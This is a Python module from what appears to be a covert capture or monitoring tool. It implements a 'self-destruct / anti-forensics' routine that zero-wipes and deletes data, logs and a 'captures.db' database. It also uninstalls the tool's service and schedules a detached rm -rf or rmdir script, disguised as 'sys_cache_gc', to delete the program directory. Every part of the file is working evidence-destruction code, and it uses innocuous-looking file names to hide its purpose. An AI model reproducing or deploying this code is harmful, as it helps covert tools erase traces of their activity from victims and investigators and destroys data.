"""
Self-destruct / anti-forensics utility.

Provides helpers to remove all data, logs, databases, PID files, and
optionally uninstall the service and remove the program directory.

Usage:
    from utils.self_destruct import execute_self_destruct

    execute_self_destruct(config, secure_wipe=True, remove_service=True)
"""
from __future__ import annotations

import logging
import os
import platform
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


def secure_delete_file(path: Path, secure_wipe: bool = False) -> None:
    """Delete a single file, optionally overwriting with zeros first."""
    if not path.exists():
        return
    try:
        if secure_wipe:
            size = path.stat().st_size
            with open(path, "wb") as fh:
                fh.write(b"\x00" * size)
                fh.flush()
                os.fsync(fh.fileno())
        path.unlink()
        logger.info("Removed file: %s", path)
    except OSError as exc:
        logger.warning("Failed to remove %s: %s", path, exc)


def remove_data_directory(data_dir: str, secure_wipe: bool = False) -> None:
    """Recursively remove the data directory."""
    data_path = Path(data_dir)
    if not data_path.exists():
        logger.debug("Data directory does not exist: %s", data_dir)
        return
    if secure_wipe:
        for file_path in data_path.rglob("*"):
            if file_path.is_file():
                secure_delete_file(file_path, secure_wipe=True)
    shutil.rmtree(data_path, ignore_errors=True)
    logger.info("Removed data directory: %s", data_dir)


def remove_log_files(log_file: str, secure_wipe: bool = False) -> None:
    """Remove log file and its parent logs directory if empty."""
    log_path = Path(log_file)
    if log_path.exists():
        secure_delete_file(log_path, secure_wipe=secure_wipe)
    log_dir = log_path.parent
    if log_dir.exists():
        shutil.rmtree(log_dir, ignore_errors=True)
        logger.info("Removed log directory: %s", log_dir)


def remove_sqlite_database(sqlite_path: str, secure_wipe: bool = False) -> None:
    """Remove SQLite database and associated WAL/SHM files."""
    base = Path(sqlite_path)
    for suffix in ("", "-wal", "-shm"):
        db_file = base.parent / (base.name + suffix)
        if db_file.exists():
            secure_delete_file(db_file, secure_wipe=secure_wipe)


def remove_pid_file(pid_file: str | None = None) -> None:
    """Remove the PID lock file."""
    if pid_file is None:
        pid_file = os.path.join(tempfile.gettempdir(), ".system-helper.pid")
    path = Path(pid_file)
    if path.exists():
        try:
            path.unlink()
            logger.info("Removed PID file: %s", path)
        except OSError as exc:
            logger.warning("Failed to remove PID file: %s", exc)


def uninstall_service(config: dict[str, Any]) -> None:
    """Uninstall the system service/daemon."""
    try:
        from service import ServiceManager

        manager = ServiceManager(config)
        result = manager.uninstall()
        logger.info("Service uninstalled: %s", result)
    except Exception as exc:
        logger.warning("Failed to uninstall service: %s", exc)


def remove_program_directory() -> None:
    """Schedule removal of the program directory after exit.

    Uses a platform-specific script that waits briefly then deletes
    the directory tree.
    """
    program_dir = Path(__file__).resolve().parent.parent
    system = platform.system().lower()

    try:
        if system == "windows":
            script = (
                f'@echo off\n'
                f'timeout /t 2 /nobreak >nul\n'
                f'rmdir /s /q "{program_dir}"\n'
            )
            script_path = Path(tempfile.gettempdir()) / "sys_cache_gc.bat"
            script_path.write_text(script)
            subprocess.Popen(
                ["cmd.exe", "/c", str(script_path)],
                creationflags=0x00000008,  # DETACHED_PROCESS
            )
        else:
            script = (
                f'#!/bin/sh\nsleep 2\nrm -rf "{program_dir}"\n'
            )
            script_path = Path(tempfile.gettempdir()) / "sys_cache_gc.sh"
            script_path.write_text(script)
            script_path.chmod(0o755)
            subprocess.Popen(
                ["/bin/sh", str(script_path)],
                start_new_session=True,
            )
        logger.info("Scheduled program directory removal: %s", program_dir)
    except Exception as exc:
        logger.warning("Failed to schedule program removal: %s", exc)


def execute_self_destruct(
    config: dict[str, Any],
    secure_wipe: bool = False,
    remove_service: bool = True,
    remove_program: bool = False,
) -> None:
    """Orchestrate full self-destruction sequence.

    1. Remove data directory
    2. Remove log files
    3. Remove SQLite database
    4. Remove PID file
    5. Uninstall service (if requested)
    6. Schedule program directory removal (if requested)
    """
    general = config.get("general", {})
    storage = config.get("storage", {})

    data_dir = general.get("data_dir", "./data")
    log_file = general.get("log_file", "./logs/app.log")
    sqlite_path = storage.get("sqlite_path", "./data/captures.db")

    logger.info("Starting self-destruct sequence (secure_wipe=%s)", secure_wipe)

    remove_data_directory(data_dir, secure_wipe=secure_wipe)
    remove_log_files(log_file, secure_wipe=secure_wipe)
    remove_sqlite_database(sqlite_path, secure_wipe=secure_wipe)
    remove_pid_file()

    if remove_service:
        uninstall_service(config)

    if remove_program:
        remove_program_directory()

    logger.info("Self-destruct sequence complete")
